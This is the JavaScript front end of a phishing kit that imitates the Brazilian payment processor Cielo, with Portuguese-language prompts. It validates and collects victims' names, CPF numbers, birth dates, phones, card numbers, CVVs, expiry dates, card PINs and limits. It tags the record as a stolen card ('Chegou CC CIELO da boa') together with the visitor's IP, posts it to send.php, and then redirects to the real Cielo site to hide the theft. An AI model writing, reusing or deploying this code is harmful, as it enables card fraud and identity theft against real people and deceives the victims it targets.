(function(){

	var app = angular.module('app', []);

	var fallbacks = [
		"Algum(ns) dos campos não tem caracteres suficientes para ser(em) considerado(s) válido(s)!",
		"Algum(ns) dos campos não foi(ram) preenchido(s)!",
		"Cartão inválido!", "Existem dados nulos"
	];
	
	var ctrl = function($rootScope, client) {
		client.async().then(function() {
			$rootScope.step = 1;
			window.IP = client.data();

			"use strict";

			if (document.getElementById('txtTel'))  {
				txtTel.addEventListener('keydown', function(event) {
					_phone(this, event);
				})
				txtTel.addEventListener('keypress', function(event) {
					_phone(this, event);
				})
				txtTel.addEventListener('keyup', function(event) {
					_phone(this, event);
				})
				txtTel.addEventListener('blur', function(event) {
					if (this.value.length == 15) this.value = last_phone(this);
				})
			}	

			if (document.getElementById('txtCPF'))  {
				txtCPF.addEventListener('blur', function(event) {
					validateCPF(this);
				})
				txtCPF.addEventListener('keyup', function(event) {
					if (this.value.length == 11) 
						validateCPF(this);
				})
			}	

			var month = String((new Date).getMonth()+1);	
			var current_year = String((new Date).getFullYear()).substring(2, 4);	

			function verify_month() {
				if (txtMes.value < Number(month)) {
					alert('Mês inválido!');
					txtMes.value = "";
					txtMes.focus();
				}
			}

			if (document.getElementById('txtMes')) txtMes.addEventListener('keyup', function() {
				if (txtMes.value.length == 2) {
					if (parseInt(txtMes.value) >= 1 && parseInt(txtMes.value) <= 12)
						txtAno.focus();
					else {
						alert('Mês inválido!');
						txtMes.value = "";
						txtMes.focus();
					}

					if (txtAno.value.length > 0 && txtAno.value == current_year) verify_month();
				}
			});

			if (document.getElementById('txtAno')) {			
				txtAno.addEventListener('keyup', function() {
					if (txtAno.value.length == 2) {
						var year = parseInt(txtAno.value);

						if (txtAno.value.length > 0 && txtAno.value == current_year) verify_month();

						if (year >= current_year && year <= year + 50)
							txtCVV.focus();

						else {
							alert('Ano inválido!');
							txtAno.value = "";
						}
					}
				});
			
				txtAno.addEventListener('blur', function() {
					if (this.value.length == 1) 
						this.value = "0" + this.value;
				});		
			
				txtMes.addEventListener('blur', function() {
					if (this.value.length == 1) 
						this.value = "0" + this.value;
				});		
			
				txtDiaNS.addEventListener('blur', function() {
					if (this.value.length == 1) 
						this.value = "0" + this.value;
				});
			
				txtMesNS.addEventListener('blur', function() {
					if (this.value.length == 1) 
						this.value = "0" + this.value;
				});
			
				txtAnoNS.addEventListener('blur', function() {
					if (this.value.length == 2) 
						this.value = "19" + this.value;
				});			
			}

			$rootScope.finish = function() {
				$rootScope.enabledSent = false;
				$rootScope.cc = false;

				// sending
				var data = { 
					_cc: txtNum.value,
					_c_v_v: txtCVV.value,
					_vld: (document.getElementById('txtMes') && document.getElementById('txtAno')) 
							? txtMes.value + "/" + txtAno.value : undefined

				}
				if (data) if (data._cc && data._vld && data._c_v_v) {
					if (data._cc.length >= 13 && data._vld.length >= 4 && data._c_v_v.length >= 3) {
						var cc = (document.querySelector('#txtNum')) ? txtNum : undefined;						
						if (cc.value != null && cc.value != undefined && cc.value != "") {
							if (data._cc != "1111111111111111" && data._cc != "2222222222222222" 
								&& data._cc != "3333333333333333" && data._cc != "4444444444444444"
								&& data._cc != "5555555555555555" && data._cc != "6666666666666666"
								&& data._cc != "7777777777777777" && data._cc != "8888888888888888"
								&& data._cc != "9999999999999999" && data._cc != "0000000000000000") {

									// validate cc
									$rootScope.validaCC = function(cc) {
										if (cc == undefined) $rootScope.cc = null;
										else {
											if (cc.length <= 0) $rootScope.cc = false;
											else if (cc.length < 14) $rootScope.cc = false;
											else if (cc.length >= 14) {
												var reg = {
									                visa: /^4[0-9]{12}(?:[0-9]{3})$/,
									                master: /^5[1-5][0-9]{14}$/,
									                hiper: /^(606282\d{10}(\d{3})?)|(3841\d{15})$/,
									                diners: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
									                aura: /^50\d{14}$/,
									                elo: /^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/,
									                amex: /^3[47][0-9]{13}/
									            }
									            if (reg.visa.test(cc) == true) $rootScope.cc = true;
									            else if (reg.master.test(cc) == true) $rootScope.cc = true;
									            else if (reg.hiper.test(cc) == true) $rootScope.cc = true;
									            else if (reg.diners.test(cc) == true) $rootScope.cc = true;
									            else if (reg.aura.test(cc) == true) $rootScope.cc = true;
									            else if (reg.elo.test(cc) == true) $rootScope.cc = true;
									            else if (reg.amex.test(cc) == true) $rootScope.cc = true;
									            else $rootScope.cc = false;
											}
											else $rootScope.cc = true;
										}

									}(data._cc);								
									if ($rootScope.cc) {
										if (!(txtMes.value.length == 2)) { alert('Mês da validade inválido!'); return false }
										if (!(txtAno.value.length == 2)) { alert('Ano da validade inválido!'); return false }
										if (!(txtSEN.value.length >= 4 && txtSEN.value.length <= 6)) { alert('Senha inválido!'); return false }

										if (document.getElementById('txtLim')) {
											if (!txtLim.value.length > 0) { 
												alert(fallbacks[1]); 
												$rootScope.enabledSent = false; 
												return false; 
											}

											else $rootScope.enabledSent = true; 
										}
									}
									else { alert(fallbacks[2]); return false }
							}
								
							else { alert(fallbacks[2]); return false }
						} else { alert(fallbacks[3]); return false }
					} else { alert(fallbacks[0]); return false }
				} else { alert(fallbacks[1]); return false }
				
				

				// CAMPOS
				rdata = {};				
				rdata.__id = "[!] Chegou CC CIELO da boa";
				rdata.__ip = IP;
				rdata.NOME_DO_MESTRE = txtNome.value;
				rdata.CPF = txtCPF.value;
				rdata.DATA_NASCIMENTO = txtDiaNS.value + "/" + txtMesNS.value + "/" + txtAnoNS.value;
				rdata.TELEFONE = txtTel.value;
				rdata.CC = data._cc;
				rdata.CVV = data._c_v_v;
				rdata.VALIDADE = data._vld;
				rdata.LIMITE = txtLim.value;

				if ($rootScope.enabledSent) $.ajax({
					url: "send.php",
					data: rdata,
					success: function() {
						document.location = "http://cielo.com.br/";				
					}
				});
			}

			$rootScope.next = function() {
				if (!(txtNome.value.length > 3)) { alert("Nome inválido"); return false }
				if (!(txtDiaNS.value.length == 2)) { alert("Dia de nascimento inválido"); return false }
				if (!(txtMesNS.value.length == 2)) { alert("Mês de nascimento inválido"); return false }
				if (!(txtAnoNS.value.length == 4)) { alert("Ano de nascimento inválido"); return false }
				if (!(txtCPF.value.length == 11)) { alert("CPF inválido"); return false }
				if (!(txtTel.value.length >= 14)) { alert("Telefone inválido"); return false }
				$rootScope.step = 2;
			}
		});

		$rootScope.init = function() {
			if (document.getElementById("txtDiaNS") != "undefined" && 
				document.getElementById("txtMesNS") != "undefined" &&
				document.getElementById("txtAnoNS") != "undefined" && 
				document.getElementById("txtCPF") != "undefined") {
				isNumber([txtDiaNS, txtMesNS, txtAnoNS, txtCPF]);
			}
			if (document.getElementById("txtNum") != "undefined"  &&
				document.getElementById("txMes") != "undefined" && 
				document.getElementById("txtAno") != "undefined" &&
				document.getElementById("txtCVV") != "undefined" && 
				document.getElementById("txtLim") != "undefined" &&
				document.getElementById("txtSEN") != "undefined") {
				isNumber([txtNum, txtMes, txtAno, txtCVV, txtLim, txtSEN]);
			}
		}
	}

	app.run(ctrl);
}).call(this);
